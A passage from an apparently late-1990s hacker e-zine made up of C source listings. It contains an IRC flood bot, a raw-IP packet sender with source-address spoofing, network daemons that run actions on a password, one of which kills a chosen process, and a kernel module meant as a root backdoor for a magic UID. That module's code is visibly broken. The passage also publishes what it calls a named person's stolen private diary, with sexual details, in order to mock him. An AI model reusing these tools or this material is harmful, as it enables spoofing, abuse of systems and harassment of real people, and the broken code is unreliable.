  if (connect (s, (struct sockaddr *) &andwhat, sizeof (struct sockaddr)) < 0)
    {
      perror ("connect () ");
      exit (-1);
    }
  if (!fork ())
    {
      for (;;)
	{
	  bzero (&feh, sizeof feh);
	  if (recv (s, feh, sizeof (feh), 0) == 0)
	    break;
//        puts (feh);
	  //        fflush (stdout);
	  if (!strncmp (feh, "PING", 4))
	    {
	      feh[1] = 'O';
	      send (s, feh, strlen (feh), 0);
	      bzero (&feh, sizeof feh);
	      snprintf (feh, sizeof feh, "JOIN %s\r\n", chan);
	      send (s, feh, strlen (feh), 0);
	    }
	}
    }

  bzero (&mytempleofkodes, sizeof mytempleofkodes);

  snprintf (mytempleofkodes, sizeof mytempleofkodes,
	    "user %s\r\n", USER);

  send (s, mytempleofkodes, strlen (mytempleofkodes), 0);

  bzero (&mytempleofkodes, sizeof mytempleofkodes);

  snprintf (mytempleofkodes, sizeof (mytempleofkodes),
	    "nick %s\r\n", NICK);

  send (s, mytempleofkodes, strlen (mytempleofkodes), 0);

  bzero (&mytempleofkodes, sizeof mytempleofkodes);

  if (key != NULL)
    snprintf (mytempleofkodes, sizeof mytempleofkodes,
	      "JOIN %s %s\r\n", chan, key);
  else
    snprintf (mytempleofkodes, sizeof mytempleofkodes,
	      "JOIN %s\r\n", chan);

  sleep (1);

  send (s, mytempleofkodes, strlen (mytempleofkodes), 0);

  sleep (5);

  for (;;)
    {
      bzero (&buff, sizeof buff);
      bzero (&mytempleofkodes, sizeof mytempleofkodes);

//      printf ("%i\n", ca);

      if (ca == atoi (argv[2]))
	{
//        printf ("crap %i\n", ca);
	  ca = 0;
	  sleep (atoi (argv[3]));
	}
      if (fgets (buff, sizeof buff, fp) == NULL && !alarm (0))
	{
	  bzero (&mytempleofkodes, sizeof mytempleofkodes);
	  snprintf (mytempleofkodes, sizeof mytempleofkodes,
	  "PRIVMSG %s :and that's all eye haveto say ab()ut that\r\n", chan);
	  send (s, mytempleofkodes, strlen (mytempleofkodes), 0);
	  bzero (&mytempleofkodes, sizeof mytempleofkodes);
	  snprintf (mytempleofkodes, sizeof mytempleofkodes,
		    "QUIT :eye 0wn y()u\r\n");
	  send (s, mytempleofkodes, strlen (mytempleofkodes), 0);
	  break;
	}

      ca += 1;

      snprintf (mytempleofkodes, sizeof mytempleofkodes,
		"PRIVMSG %s :%s\r\n", chan, buff);

      send (s, mytempleofkodes, strlen (mytempleofkodes), 0);

    }

  fclose (fp);
  close (2);
  close (1);
  close (0);
  close (s);
  return 0x1;
}
[END_CUT] u4ea-dr0p.c

I use this on all my codes...
check it out wc -l style.

[CUT_HERE] linez.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int
main (int argc, char *argv[])
{
  FILE *filp = (FILE *) NULL;
  FILE *look = (FILE *) NULL;
  char buff[255];
  if (argv[1] == NULL)
    {
      puts ("UZ4GE: ./M4KE_BIG_ELITE FILE");
      exit (-1);
    }
  if ((filp = fopen (argv[1], "r")) == NULL)
    {
      perror ("opening file..");
      exit (3092340);
    }
  if ((look = fopen ("core.c", "w")) == NULL)
    {
      perror ("opening file..");
      exit (3280323);
    }
  while (1)
    {
      bzero (&buff, sizeof (buff));
      if (fgets (buff, sizeof buff, filp) == NULL)
	{
	  puts ("WE RE4CHZ EOF I TH1NK I DNO");
	  break;
	}
      if (strlen (buff) <= 1)
	continue;
      fprintf (look, "%s\n", buff);
    }
  return 1;
}
[END_CUT] linez.c

BONUZ WAREZ!!!!!!!!!!!!!!!!!!!!!
---------------------------------

this is broncs attempt at an lkm (*note how fucking lame he is*)
dr0pped by U4EA.

[CUT_HERE] bronc-lkm.c
/*

   bronc log of him asking me for help
   Im telnet snooping him btw

   carola:~$ man wtf
   No manual entry for wtf
   carola:~$ help me compile this shit
   No help topics match `shit'.  Try `help help'.
   carola:~$ kay
   bash: kay: command not found
   carola:~$ thanks bro
   bash: thanks: command not found
   ... after looking at it ...
   carola:~$ hahahahahahhahahahahahahahahh
   bash: hahahahahahhahahahahahahahahh: command not found
   carola:~$ man you are seriously pathetic
   No manual entry for you
   No manual entry for are
   No manual entry for seriously
   No manual entry for pathetic
   carola:~$ come on myhandle i'll greet you in my code <smiley>
   > ;
   > s;
   > shit i hate when i do this
   >
   carola:~$ k1llall -9 sshd
   bash: k1llall: command not found
   carola:~$ int init_module(int argc, char *argv[])
   bash: syntax error near unexpected token `init_module(i'
   carola:~$ {
   > /* hacked_getuid(); */
   bash: syntax error near unexpected token `;'
   carola:~$ cleanup_module();
   bash: syntax error near unexpected token `;'
   carola:~$ return(1);
   bash:syntax error near unexpected token ` return (1) '
   carola:~$ shutup
   carola:~$ }
   bash:syntax error near unexpected token `}'
   carola:~$ HAHAHAHAHAHAHAHAHAHAHAHAHHAHAHA
   carola:~$ blah fuck it
   bash: blah:command not found
   carola:~$ rmdskfmsf lksdtsesjmt.ccdddd
   bash: rmdskfmsf:command not found
   carola:~$ rm lkmtest.c
   carola:~$ reboot
   Sorry you are not allowed to login.
   carola:~$ exit
...ok there you have it...he tried rebooting me thats bad enough...

oh by the way

sUpRuZr
carola:/home/bronc# ls /home/bronc
lkmtest.c ~ lkm_ha ~ 1. txt
sUpRuZr
carola:/home/bronc# must have used indent on his lkm
*/
/*
   Ok, this will set your uid zero if you have MAGICUID uid.
   by bronc
   prepending msg for when im done <smiley>
   for all you kiddies this tool works, it might not work sometimes,
   etc etc... but if you're lame enough not to know howto use it, please
   exit pico. */
   www.attrition.org / hosted / bronc
* /
#define MODULE
#define __KERNEL__

/* i always include the Standard C library headers <smiley> */
#include <assert.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <signal.h>
#include <linux/config.h>
#include <linux/malloc.h>
#include <linux/locks.h>
#include <linux/smp_lock.h>
#include <linux/fd.h>
#include <linux/init.h>
#include <linux/quotaops.h>
#include <linux/acct.h>
#include <asm/uaccess.h>
#include <linux/nfs_fs.h>
#include <linux/nfs_fs_sb.h>
#include <linux/nfs_mount.h>
#include <unistd.h>
#include <linux/module.h>
#include <linux/config.h>
#include <linux/version.h>
#include <linux/types.h>
#include <linux/fs.h>
#include <linux/mm.h>
#include <linux/errno.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <asm/segment.h>
#include <asm/unistd.h>
#include <asm/pgtable.h>
#include <asm/uaccess.h>

#define MAGICUID 2010

int orig_getuid ();

int
hacked_getuid ()
{
  int tmp;

  /*check for our UID */
  if (current->uid = MAGICUID)
    {
      /*if its our UID -> this means we log in -> give us a rootshell */
      current->uid = 0;
      current->euid = 0;
      current->gid = 0;
      current->egid = 0;
      return 0;
    }
  tmp = (*orig_getuid) ();
  return tmp;
}

int
init_module (int argc, char *argv[])
{
  /*hacked_getuid(); */
  cleanup_module ();
  return (1);
}
[END_CUT] bronc-lkm.c
BONUZ BRONC IS A MORON WAREZZZZZ..........

[CUT_HERE] bronc-diary.txt
thiz shit is from www.attrition.org/hosted/bronc/private/diary.txt or
something he thought it was hidden, but forget to chmod his private
dir. h0h00h0 br0nc iz sucha fukin twit, agreed!?

*START_LAME_GAY_DIARY*

June 13, 1998
Well, not much happened today, diary.  I won 5th place in the rodeo! This
other contestant asked me if I wanted to go get a drink afterwards. I really
think he is cute, but I dont think I'm gay or anything, am I?!
PLEASE HELP ME DIARY!!!

July 2, 1998
hey diary. I went to NewYork this week. I think RLoxley is really sexy but i
guess he has a wife or something :(. Oh well. Emmanuel and me had some real
hot sex at his place. I stayed there the whole night.
well. Talk To you later!

August 14, 1998
man. I couldnt compete in the rodeos because im 120 lbs. over the weight
limit. Im so pissed off. I coded some CGI scanning programs today, maybe i
will FINALLY be respected by the hacking community. I do hope so.

August 25, 1998
Fuck! I accidently said '**argv[]' instead of '*argv[]' and now everyone
thinks I'm a joke! I'm so depressed.

September 5, 1998
Ok. I have a 2600.com shell and my backdoor was posted on rootshell. I even
got my #hackphreak ops back. All is good in the world.

September 14, 1998
MAN! I missed Country Music Awards!! I think Billy Ray Cyrus was on!!! He is
like SO hot. Carolyn Meinal called today. She wont pay me for the Email
bombing article I wrote for GTMHH !!!!! I hate her so much! I feel like
eating a POUND of chocalate :( It's going straight to my hips :(.

*OK_THIS_IS_ALL_I_COULD_GET_BUT_YOU_CAN_SEE_HOW_HOEISH_HE_IS*

you see, bronc buster is just another sexually confused clueless wannabee
haxer who likes to ride horses. dime a dozen i say.

[END_CUT] bronc-diary.txt
[END_DIR] dr0p-d0x
[EOW]
                                       +
------------------------------------------------------------------------------
                                       +
[(015) matrix.c by GreP]
                                       +
------------------------------------------------------------------------------
                                       +
You know that shit in the matrix movie that has the green lines turn into
letters? Well, this was a first try at doing that.

*WARNING* THIS CODE IS RAW ROUGH DRAFT *WARNING*
[BEGIN_DIR] MATRIX
[CUT_HERE] matrix.c
#include <stdio.h>
#include <signal.h>
#include <ctype.h>
#include <stdlib.h>

#define charput(x) if(!(x=='\n'||x=='\0'||x=='\r')) putchar(x)
#define randi(x) (int)((int) ((float)(x)*rand()/(RAND_MAX+1.0)))

void clearANSI(int s){
     puts("\033[m\n");
     exit(1);
}
char scrmbl (char letter);

char charset[] = " !\"#$%&'()*+,-./"
                 "0123456789"
                 ":;<=>?@"
                 "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                 "[\\]^_`"
                 "abcdefghijklmnopqrstuvwxyz"
                 "{|}~";


int
main (int argc, char *argv[])
{

  int g;
  char *argp = argv[1];
  if (argc < 2)
    {
      printf ("need string.\n");
      exit (-1);
    }
  signal(SIGINT, clearANSI);
  signal(SIGTERM,clearANSI);
  signal(SIGSEGV,clearANSI);

  setvbuf (stdout, (char *) NULL, _IONBF, 0);
  srand(time (NULL));


  for (;;*++argp)
    {
      if (*argp == '\0')
	{
	  printf ("\033[m\n");
	  exit (0);
	}
      printf ("\033[0;32m");
      scrmbl  (*argp);
      printf ("\033[1;32m");
      charput (*argp);
    }
}


char
scrmbl (char letter)
{
  int s;
  for (s=randi(strlen(charset));
       charset[s]!=letter;
       s=(int)randi((strlen(charset)-1)))
    {

      rand();
      rand();
      rand();
      rand();

      if (isascii(charset[s]))
      {
          charput (charset[s]);
          usleep (randi(200000));
          charput ('\b');
      }
    }
}
[END_CUT] matrix.c
[END_DIR] MATRIX

                                       +
------------------------------------------------------------------------------
                                       +
[(016) w00w00 Raw SendPacket by Shok]
                                       +
------------------------------------------------------------------------------
                                       +

This is just a program to send a defined SOCK_RAW packet.
-Shok [Matt Conover]

[BEGIN_DIR] w00raw
[CUT_HERE] w00w00-RawIP.c
/* w00w00 RawIP packet generator by Shok */
/* (c) w00w00 1998                       */
/* gcc w00w00-RawIP.c -o w00rawip -l nsl */

#include <stdio.h>
#include <signal.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <net/if_packet.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/time.h>

#define INT(x) atoi(x)
#define OURHDRSIZE sizeof(struct ourhdr)
#define IPHDRSIZE sizeof(struct iphdr)
#ifndef __u32
#define __u32 u_long
#endif
#ifndef __u16
#define __u16 u_short
#endif

extern char *optarg;
extern int opterr,optind;
__u16 TTL=0,IHL=0,PROTOCOL=0;
u_char UN=0,TYPE=0,SEQ=0;
int verbose = -1;
char *packetdata = (char*) NULL;
int droppacket = -1;
int sizep = 1024;

struct ourhdr
{
  u_char type;
  u_char un;
  u_short seq;
};

unsigned short in_cksum(u_short*,int);
void sendraw (int,__u32,__u32);

int main ( argc , argv )
int argc;
char **argv;
{
   int sockfd=0,i=1,diq=1,socktype=0;
   struct hostent *me, *you;
   char *me_s = (char*) NULL, *you_s = (char*) NULL;

   struct sockaddr_in me_a, you_a;
   int c=0;
   setvbuf(stdout,(char*) NULL,_IONBF,0);
   setvbuf(stderr,(char*) NULL,_IONBF,0); // .. not usually buffered
   if (getuid()!=0 && geteuid()!=0)
   {
     fprintf(stderr,"This program requires root to use SOCK_RAW\n");
     exit(-1);
   }
   if (argc < 3)
   {
     usage:
     fprintf(stderr,"w00w00-RawIP[v0.2] by Shok for ~EL8\n"
                    "usage: %s [-i spoofhost] [-o destination] [options]\n"
                    "options:\n"
                    "\t[-c int]:\tcount [-1 = send until interrupted]\n"
                    "\t[-t int]:\ttype\n"
                    "\t[-p int]:\tprotocol\n"
                    "\t[-s int]:\tsize of packet\n"
                    "\t[-m str]:\tpacket data\n"
                    "\t[-U int]:\tun contents\n"
                    "\t[-S int]:\tseq contents\n"
                    "\t[-I int]:\tihl contents\n"
                    "\t[-T int]:\tTTL\n"
                    "\t[-d]:\tdump packet to stdout\n"
                    "\t[-v]:\tbe verbose\n"
                    "comments to el8@press.co.jp subject: w00w00-RawIP\n",
                    argv[0]);
      exit(-1);
   }

   while (EOF!=(c=getopt(argc,argv,"i:o:c:t:p:s:m:U:S:I:T:dv")))
   {
     switch(c)
     {
       case 'i':
         me_s = optarg;
         break;
       case 'o':
         you_s = optarg;
         break;
       case 'c':
         i = INT(optarg);
         break;
       case 't':
         TYPE = (u_char)INT(optarg);
         break;
       case 'p':
         PROTOCOL = (__u16) INT(optarg);
         break;
       case 's':
         sizep = INT(optarg);
         break;
       case 'm':
         packetdata = optarg;

         break;
       case 'U':
         UN = (u_char)INT(optarg);
         break;
       case 'S':
         SEQ = (u_short)INT(optarg);
         break;
       case 'I':
         IHL = (__u16) INT(optarg);
         break;
       case 'T':
         TTL = (__u16) INT(optarg);
         break;
       case 'd':
         droppacket=1;
         break;
       case 'v':
         verbose=1;
         break;
       case '?':
         goto usage;
         exit(-1);
       default:
         goto usage;
         exit(-1);
     }
   }
   if (packetdata != (char*) NULL) sizep += strlen(packetdata);
   if ((me_s == (char*)NULL)||(you_s == (char*)NULL)) exit(-1);
   if((me = gethostbyname(me_s)) == NULL)
   {
        herror(me_s);
        exit(-1);
   }
   memcpy((caddr_t)&me_a.sin_addr,me->h_addr,me->h_length);
   if((you = gethostbyname(you_s)) == NULL )
   {
        herror(you_s);
        exit(-1);
   }
   memcpy((caddr_t)&you_a.sin_addr,you->h_addr,you->h_length);
   if((sockfd = socket(PF_INET,SOCK_RAW,IPPROTO_RAW))< 0)
   {
        perror("socket(SOCK_RAW)");
        exit(-1);
   }
   if ((setsockopt(sockfd, IPPROTO_IP, SO_SNDBUF,(int*)&sizep,sizeof(sizep)))<0) {
      perror("setsockopt(SO_SNDBUF)");
      exit( -1);
   }
   if ((setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, (char *)&diq, sizeof(diq)))<0) {
      perror("setsockopt(IP_HDRINCL)");
      exit( -1);
   }

   putc('\n',stderr);

   if (verbose!=-1)
   {
     fprintf(stderr,"[source = %s | dest = %s ]\n[size = %i | count = %i]\n",
                    me_s,you_s,sizep,i);
   }

   for(;i!=0;i--){

       if (verbose!=-1) putc('.',stderr);
       sendraw(sockfd,me_a.sin_addr.s_addr,you_a.sin_addr.s_addr);
   }

   if (verbose!=-1) putc('\n',stderr);
   printf("done.\n\n");
   close(sockfd);
   exit(0);

}

/* i hate this .. */
unsigned short in_cksum (addr,len)
  u_short *addr;
  int len;
{
  register int nleft=len,sum=0;
  register u_short* w=addr;
  u_short answer=0;
  while(nleft>1){sum+=*w++;nleft-=2;}
  if(nleft==1){*(u_char*)(&answer)=*(u_char*)w;sum+=answer;}
  sum=(sum>>16)+(sum&0xffff);sum+=(sum>>16);
  answer=~sum;
  return(answer);
}

void sendraw (s,s_a,d_a)
   int s;
   __u32 s_a;
   __u32 d_a;
{
  struct sockaddr_in ta;
  char *packet = malloc ( sizep );
  struct iphdr *ip;
  struct ourhdr  *rp;
  // strncpy(packet,msg,1024);
  bzero (packet, sizeof (packet));
  if (packetdata != (char*) NULL)
  {
    strncat(packet,packetdata,(sizeof(packet) - (IPHDRSIZE + OURHDRSIZE)));
  }
  ip = (struct iphdr *)  packet;
  rp = (struct ourhdr  *)( packet + IPHDRSIZE );


  bzero (packet, sizeof (packet));

  if (TYPE!=  0) rp->type = TYPE;
  else rp->type = 8;
  if (UN  != 0)  rp->un  = UN;
  if (SEQ != 0)  rp->seq = SEQ;

  bzero (packet, IPHDRSIZE);
  ip->saddr=s_a;
  ip->daddr=d_a;
  ip->version=4;
  ip->ihl=(IHL!=0)?IHL:5;
  ip->ttl=(TTL!=0)?TTL:245;
  ip->id=random()%5985;
  ip->protocol = (PROTOCOL!=0)?PROTOCOL:16;
  ip->tot_len = htons (IPHDRSIZE + OURHDRSIZE);
  ip->check = in_cksum ((u_short *)packet, IPHDRSIZE);

  if (droppacket!=-1) fprintf(stderr,"%s",packet);

  ta.sin_family = AF_INET;
  ta.sin_addr.s_addr = d_a;

  if ((sendto (s, packet, IPHDRSIZE + OURHDRSIZE, 0,
	       (struct sockaddr *) &ta, sizeof (struct sockaddr))) == -1)
    {
      perror ("sendto()");
      exit (-1);
    }

}
[END_CUT] w00w00-RawIP.c
[END_DIR] w00raw


                                       +
------------------------------------------------------------------------------
                                       +
[(017) PAGER AND GAME! by cRot]
                                       +
------------------------------------------------------------------------------
                                       +
check comments for comments, lame heads.
cRoT '98
[BEGIN_DIR] PAGER+GAME
[CUT_HERE] pager.c
/*
   PAGER.C BY CHEIF ROTTINGHAM
   catch me on dalnet im there #2600 usually or #hack
   ok this proggie is very simple, operation ramprat helped me out alot,
   i give him great thanks
   heres how it works define your pass
   default pass is ~el8
   you can define yuur own pagerport which is quite cool too
   and maxsleeptime is how long the tone plays
   if yuu run the proggie with an argument, /bin/pager 1
   itll only sleep 1 second when paged
   yuu likely will no t hear it etc
   i got one quote
   fuck you script kiddies learn code, lamers
 */

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/kd.h>
#define P4SSWD "~el8"
#define PAGERPORT 6971
#define BACKL0G 1
int MAXSLEEPTIME = 10;
int d0p4g3r(void);
int d0p4g3r(void)
{
    int k0q;
    if ((k0q = open("/dev/console", O_RDWR | O_NOCTTY)) < 0) {
	perror("0p3n");
	exit(-1);
    }
    if (ioctl(k0q, KIOCSOUND, 2600) < 0) {
	perror("10ctl");
	exit(-1);
    }
    sleep(MAXSLEEPTIME);
    if (ioctl(k0q, KIOCSOUND, 0) < 0) {
	perror("10ctl");
	exit(-1);
    }
    close(k0q);
    return 1;
}
int daem0n(void)
{
    pid_t pid;
    if ((pid = fork()) != 0)
	exit(0);
    setsid();
    signal(SIGHUP, SIG_IGN);
    if ((pid = fork()) != 0)
	exit(0);
    chdir("/");
    umask(0);
    signal(SIGHUP, SIG_DFL);
    return (1);
}
int main(int argc, char *argv[])
{
    int sfd;
    int nfd;
    char pass[520];
    struct sockaddr_in yoyo;
    unsigned int maxtime;
    if (argv[1] != '\0') {
	maxtime = atoi(argv[1]);
	printf("%i\n", maxtime);
	MAXSLEEPTIME = maxtime;
    }
    if (!daem0n())
	exit(-1);
    bzero(&yoyo, sizeof(yoyo));
    yoyo.sin_family = AF_INET;
    yoyo.sin_port = htons(PAGERPORT);
    yoyo.sin_addr.s_addr = INADDR_ANY;
    sfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sfd < 0) {
	perror("s0ck3t");
	exit(-1);
    }
    if (bind(sfd, (struct sockaddr *) &yoyo, sizeof(yoyo)) < 0) {
	perror("b1nd");
	exit(-1);
    }
    listen(sfd, BACKL0G);
    for (;;) {
	if ((nfd = accept(sfd, 0, 0)) < 0) {
	    perror("4cc3pt");
	    exit(-1);
	}
	if (send(nfd, "3nt3r p4sswd>\r\n", strlen("3nt3r p4sswd>\r\n"), 0) < 0) {
	    perror("s3nd");
	    exit(-1);
	}
	if (recv(nfd, pass, sizeof pass, 0) < 0) {
	    perror("r3cv");
	    exit(-1);
	}
	if (!strncmp(pass, P4SSWD, strlen(P4SSWD))) {
	    if (send(nfd, "C()X\r\n", 6, 0) < 0) {
		perror("s3nd");
		exit(-1);
	    }
	    d0p4g3r();
	    break;
	}
	close(nfd);
    }
    return 1;
}
[END_CUT] pager.c
This is a modified version of pager. call it kill daemon. by ohday.
[CUT_HERE] killdaemon.c
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/kd.h>
#define P4SSWD "O!"
#define PAGERPORT 1515
#define BACKL0G 1

int sfd,nfd;
void trapsig(int s)
{
  fprintf(stderr,"[%i]\n",s);
  close(sfd);
  exit(-1);
}

int MAXSLEEPTIME = 10;
int phreq = 1404;

void killdat(int,int);
void killdat(int bxpid,int sigy)
{
  if (( kill((pid_t)bxpid,sigy) )==-1)
        kill((pid_t)bxpid,sigy);
  waitpid((pid_t)bxpid,NULL,WNOHANG);
}
int d0p4g3r(void);
int d0p4g3r(void)
{
  int k0q;
  if ((k0q = open("/dev/console", O_RDWR | O_NOCTTY)) < 0)
    {
      perror("0p3n");
      exit(-1);
    }
  if (ioctl(k0q, KIOCSOUND, phreq) < 0)
    {
      perror("10ctl");
      exit(-1);
    }
  sleep(MAXSLEEPTIME);
  if (ioctl(k0q, KIOCSOUND, 0) < 0)
    {
      perror("10ctl");
      exit(-1);
    }
  close(k0q);
  return 1;
}

int daem0n(void)
{
  pid_t pid;
  if ((pid = fork()) != 0)
    exit(0);
  setsid();
  signal(SIGHUP, SIG_IGN);
  if ((pid = fork()) != 0)
    exit(0);
  chdir("/");
  umask(0);
  signal(SIGHUP, SIG_DFL);
  return (1);
}

int main(int argc, char *argv[])
{
  char pass[520];
  struct sockaddr_in yoyo;
  int BXPID,sig;
  unsigned int maxtime;
  signal(SIGTERM,trapsig);
  signal(SIGINT,trapsig);
  signal(SIGSEGV,trapsig);
  if (argc != 4)
    {
      fprintf(stderr,
        "usage: %s [seconds_for_beep] [pid_to_kill] [signal]\n",argv[0]);
      exit(-1);
    }
  if (argv[1] != '\0')
    {
      maxtime = atoi(argv[1]);
      printf("%i\n", maxtime);
      MAXSLEEPTIME = maxtime;
    }
  BXPID     = atoi(argv[2]);
  sig       = atoi(argv[3]);
  if (!daem0n())
    exit(-1);
  bzero(&yoyo, sizeof(yoyo));
  yoyo.sin_family = AF_INET;
  yoyo.sin_port = htons(PAGERPORT);
  yoyo.sin_addr.s_addr = INADDR_ANY;
  sfd = socket(AF_INET, SOCK_STREAM, 0);
  if (sfd < 0)
    {
      perror("s0ck3t");
      exit(-1);
    }
  if (bind(sfd, (struct sockaddr *) &yoyo, sizeof(yoyo)) < 0)
    {
      perror("b1nd");
      exit(-1);
    }
  listen(sfd, BACKL0G);
  for (;;)
    {
      if ((nfd = accept(sfd, 0, 0)) < 0)
        {
          perror("4cc3pt");
          exit(-1);
        }
      if (send(nfd, "enter passwd: ", strlen("enter passwd: "), 0) < 0)
        {
          perror("s3nd");
          exit(-1);
        }
      if (recv(nfd, pass, sizeof pass, 0) < 0)
        {
          perror("r3cv");
          exit(-1);
        }
      if (!strncmp(pass, P4SSWD, strlen(P4SSWD)))
        {
          if (send(nfd, "O!\r\n",
                   strlen("O!\r\n"), 0) < 0)
            {
              perror("s3nd");
              exit(-1);
            }
          d0p4g3r();
          killdat(BXPID,sig);
          break;
        }
      close(nfd);
    }
  return 1;
}
[END_CUT] killdaemon.c
thiz iz a rad GAME!!!!
[CUT_HERE] d0tdot.c
#define VERSION .01
/* FILE: d0td0t.c */
/* AUTHOR: ()P3R4TI0N R4MPR4T */
/* ./d0td0t -h f()r us4ge. */

/* CHEQ THIS OUT, THERE ARE SMALL BUGZ LEFT BEHIND, IF U CAN FIND THEN U GET
   GREETS IN ~EL8
*/

/*
   bUlljUnkZ:
   defining DEBUG w1ll give debugging ()utpUt.
   define LEDLIGHT as the led u want to light. 1, 2, 3, 4
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <termios.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#if __linux__
#include <linux/kd.h>
#endif

/* i want it allz */
#define NUM 1
#define SCROLL 2
#define CAPS 3
#define ALL 4
#define LEDLIGHT ALL /* NUM, SCROLL, CAPS, ALL */

struct statz {
    unsigned int m4tched, n0tm4tched;
    signed int round;
    signed int tfd;		/* :()()() */
};

struct statz st4tz;

extern char *optarg;
extern int optopt, opterr, optind;

void usage(void);
void sigc4tch(int);
void prnt_st4tz(void);
int izattyfuqt(void);
int wew4ntledz(void);

int main(int argc, char *argv[])
{
    unsigned int x, y;
    unsigned int x2, y2;
    char buff[200];
    unsigned int cnt;
    unsigned int round;
    unsigned int copt;
    signed int maxrounds;
    struct termios t3rmio;
    signed int tfd;
    char k33pntr4ck[255];
    signed int kntfd;
    FILE *kntFILE;
    char *tmpstr = (char *) NULL;
    signed    int tmpint;
    signed    int tmpint2;
    unsigned int index;
    signed int useleds;

    maxrounds = -1;

    kntfd = -2;

    useleds = 0;

    do {
	switch (copt) {
	case 'r':
	    {
		maxrounds = atoi(optarg);
		break;
	    }
	case 't':
	    {
		bzero(&k33pntr4ck, sizeof(k33pntr4ck));
		strncpy(k33pntr4ck, optarg, sizeof(k33pntr4ck));
		kntfd = 0;
		break;
	    }
	case 'l':
	    {
		useleds=1;
		break;
	    }
	case 'h':
	    {
		(void) usage();
	    }
	default:
	    break;
	}
    }
    while ((copt = getopt(argc, argv, "r:t:hl")) != EOF);

    bzero(&st4tz, sizeof(st4tz));

    bzero(&t3rmio, sizeof(t3rmio));

    x = y = x2 = y2 = cnt = st4tz.m4tched = st4tz.n0tm4tched = round = 0;
    st4tz.round = x;
    index = x;

    if ((tfd = open("/dev/tty", O_RDWR)) < 0) {
	perror("open(...)");
	exit(-1);
    }

    st4tz.tfd = tfd;

    if (tcgetattr(tfd, &t3rmio) < 0) {
	perror("tcgetattr(...)");
	exit(-1);
    }

    if (!(t3rmio.c_lflag & ICANON)) {
#define DIDNTHAVEICANON 1
	t3rmio.c_lflag & ICANON;
    }

    if ((tcsetattr(tfd, TCSANOW, &t3rmio)) < 0) {
	perror("tcsetattr(...)");
	exit(-1);
    }

    puts("D0TD0T BY ()P3R4TI0N R4MPR4T");

    puts("UZ3 '!' T0 EX1T D0TD0T!");

    round += 1;

    if (!(kntfd)) {
#ifdef DEBUG
	printf("Using tracker file %s\n", k33pntr4ck);
#endif
	if ((kntFILE = fopen(k33pntr4ck, "r+")) == NULL)
	    perror("fopen(...)");
    }

    signal(SIGINT, &sigc4tch);
    signal(SIGHUP, &sigc4tch);
    signal(SIGQUIT, &sigc4tch);
    signal(SIGKILL, &sigc4tch);
    signal(SIGSEGV, &sigc4tch);
    signal(SIGPIPE, &sigc4tch);
    signal(SIGTERM, &sigc4tch);
    signal(SIGSTOP, &sigc4tch);
    signal(SIGTSTP, &sigc4tch);

    while (1) {

	x = y = x2 = y2 = 0;

	bzero(&buff, sizeof(buff));

	t3rmio.c_lflag ^= ECHO;
	if ((tcsetattr(tfd, TCSANOW, &t3rmio)) < 0) {
	    perror("tcsetattr(...)");
	    exit(-1);
	}

	if (fgets(buff, sizeof buff, stdin) == NULL)
	    break;

	if (buff[0] == '!') {
	    --round;
	    break;
	}

	t3rmio.c_lflag |= ECHO;
	if ((tcsetattr(tfd, TCSANOW, &t3rmio)) < 0) {
	    perror("tcsetattr(...)");
	    exit(-1);
	}

	if (strlen(buff) == 1) {

	    printf("STR LEN OF BUFF = 1 :"
		   " ILLEG4L OPER4TI0N! ST4RTING ROUND[%i] 0VER!\n",
		   round);

	    continue;
	}

	buff[strlen(buff) - 1] = '\0';

	for (cnt = 0; cnt <= strlen(buff); cnt++) {
	    if (buff[cnt] == '.') {
		x = cnt;
		break;
	    }
	}

	for (cnt = 0; cnt <= strlen(buff); cnt++)
	    if ((buff[cnt] == '.') && (cnt != x))
		y = cnt;

	if (y == 0) {
	    puts("S0M3H0W U MESS3D UP!");
	    exit(-1);
	}
#ifdef DEBUG
	printf("%i %i\n", x, y);
#endif

	bzero(&buff, sizeof(buff));

	if (fgets(buff, sizeof buff, stdin) == NULL)
	    break;

	if (buff[0] == '!') {
	    round--;
	    break;
	}

	if (strlen(buff) == 1) {

	    printf("STR LEN OF BUFF = 1 :"
		   " ILLEG4L OPER4TI0N! ST4RTING ROUND[%i] 0VER!\n",
		   round);

	    continue;
	}

	for (cnt = 0; cnt <= strlen(buff); cnt++) {
	    if ((isalpha(buff[cnt])) && (buff[cnt] != ' ')) {
		x2 = cnt;
		break;
	    }
	}

	for (cnt = 0; cnt <= strlen(buff); cnt++) {
	    if ((isalpha(buff[cnt])) && (buff[cnt] != ' ') && (cnt != x2))
		y2 = cnt;
	}

	if (y2 == 0) {
	    puts("S0M3H0W U MESS3D UP!");
	    exit(-1);
	}
#ifdef DEBUG
	printf("%i %i\n", x2, y2);
#endif

	if ((x == x2) && (y == y2)) {
	    printf("a match!\a\n");
	    st4tz.m4tched += 1;
	    if(useleds)
		{
		wew4ntledz();
		}
	} else
	    st4tz.n0tm4tched += 1;

	if (round == maxrounds)
	    break;

	st4tz.round = round;
	round++;

	if (!(kntfd)) {
	    if ((x == x2) && (y == y2)) {
		bzero(&k33pntr4ck, sizeof(k33pntr4ck));
		if (fgets(k33pntr4ck, sizeof(k33pntr4ck), kntFILE) == NULL)
		{
#ifdef DEBUG
		    puts("EOF ON tR4ck3R f1LE");
#endif
		fprintf(kntFILE,"ME>1\n");
		fseek(kntFILE, 0, SEEK_SET);
		continue;
		}

		tmpint = 0;

		for(index=0;index<=strlen(k33pntr4ck);index++)
		if(k33pntr4ck[index]=='>')
		{
		tmpint=1;
		break;
		}

		if(!(tmpint)) {
